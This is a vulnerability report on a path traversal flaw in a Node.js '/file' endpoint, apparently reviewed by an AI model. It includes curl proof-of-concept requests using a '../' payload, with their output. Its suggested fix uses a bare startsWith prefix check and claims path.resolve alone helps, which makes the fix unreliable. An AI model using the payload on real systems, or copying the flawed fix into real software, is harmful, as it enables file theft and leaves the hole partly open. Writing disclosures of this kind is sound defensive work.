# R001: Path traversal via unvalidated path.join()

**Date**: 2026-09-22
**Severity**: High
**Impact**: Information Disclosure
**Subsystem**: web-page
**Final review by**: claude-haiku-4-5, default

## Summary

The `/file` endpoint accepts an attacker-controlled `name` query parameter and passes it directly to `path.join(publicDir, name)` without boundary validation. This allows path traversal via relative path sequences (`../`) to read arbitrary files accessible to the Node.js process, including application source code and potentially sensitive system files.

## Root Cause

The `sendFile()` function at index.js:27-36 calls `readFile(join(publicDir, name))` where `name` comes from the untrusted query parameter (extracted at index.js:12). Node.js's `path.join()` resolves relative path sequences in its second argument without enforcing that the result stays within the base directory. No validation, normalization check, or boundary enforcement exists between extraction and file access.

## Reproduction

1. Start the server: `PORT=3123 node index.js`
2. Request a file outside the `public/` directory: `curl 'http://localhost:3123/file?name=../index.js'`
3. The response contains the full source code of `index.js`, confirming the traversal

Any attacker can read any file on the system that the Node.js process has permission to access by providing relative path sequences in the `name` parameter.

## Affected Code

- `index.js:12` — `parseRequest()` extracts the untrusted `name` parameter
- `index.js:27-36` — `sendFile()` reads the file without boundary validation
- `index.js:29` — `readFile(join(publicDir, name))` — the vulnerable sink

## PoC

- **Target test file**: None (demonstration method is direct HTTP request)
- **Test language**: HTTP/cURL
- **How to run**: Start the server on a spare port and send requests with curl

### Demonstration Commands and Output

**Command 1: Normal file access (control)**
```bash
curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=hello.txt'
```

Output:
```
Hello from the public directory.

status=200
```

**Command 2: Path traversal to read index.js (vulnerable)**
```bash
curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=../index.js'
```

Output:
```
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { join } from "node:path";

const port = Number(process.env.PORT || 3000);
const publicDir = join(process.cwd(), "public");

[... full source code of index.js ...]

status=200
```

## Expected vs Actual Behavior

- **Expected**: Requests with traversal sequences (`../`) should either be rejected (400/403) or the path should be validated to ensure it stays within `public/`. The application should only serve files from the intended `public/` directory.
- **Actual**: The application accepts and processes path traversal sequences, allowing arbitrary file reads via `path.join()` without boundary enforcement.

## Adversarial Review

1. **Exercises claimed bug**: YES — The test directly reads a file outside the `public/` directory using `../index.js`, proving `path.join()` does not enforce directory boundaries.
2. **Realistic preconditions**: YES — The vulnerability is triggered by a simple HTTP GET request with a crafted query parameter. No special setup, authentication, or internal APIs required.
3. **Bug vs by-design**: BUG — The code clearly intends to serve files only from the `public/` directory (indicated by the `publicDir` variable and its use in the endpoint). The lack of boundary validation is not documented or commented as intentional; it is a classic path traversal vulnerability.
4. **Final severity**: High — Information Disclosure via arbitrary file read is HIGH severity. Attackers can access application source code and potentially sensitive files.
5. **In scope**: YES — This is in the web-page subsystem (`/file` endpoint), a path traversal weakness, requiring no authentication.
6. **Test correctness**: CORRECT — The test makes a valid HTTP request to the vulnerable endpoint, uses a standard path traversal payload, and correctly verifies that a file outside the intended directory is returned. No circular logic or false assertions.
7. **Alternative explanations**: NONE — The file is returned because `path.join()` resolves relative paths without boundary validation. No other mechanism explains the behavior.
8. **Novelty**: NOVEL — This is a genuine, previously unreported vulnerability in this application.

## Suggested Fix

Validate that the resolved path remains within the `public/` directory boundary before reading the file. The most direct fix is to use `path.resolve()` instead of `path.join()`, or implement an explicit boundary check:

```javascript
async function sendFile(response, name) {
  try {
    const resolvedPath = path.resolve(path.join(publicDir, name));
    
    // Ensure the resolved path is within publicDir
    if (!resolvedPath.startsWith(publicDir)) {
      sendGreeting(response, "Not found\n");
      return;
    }
    
    const body = await readFile(resolvedPath);
    response.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
    response.end(body);
  } catch {
    sendGreeting(response, "Not found\n");
  }
}
```

Alternatively, reject traversal sequences entirely by validating that the `name` parameter does not contain `../` or `..\\`.
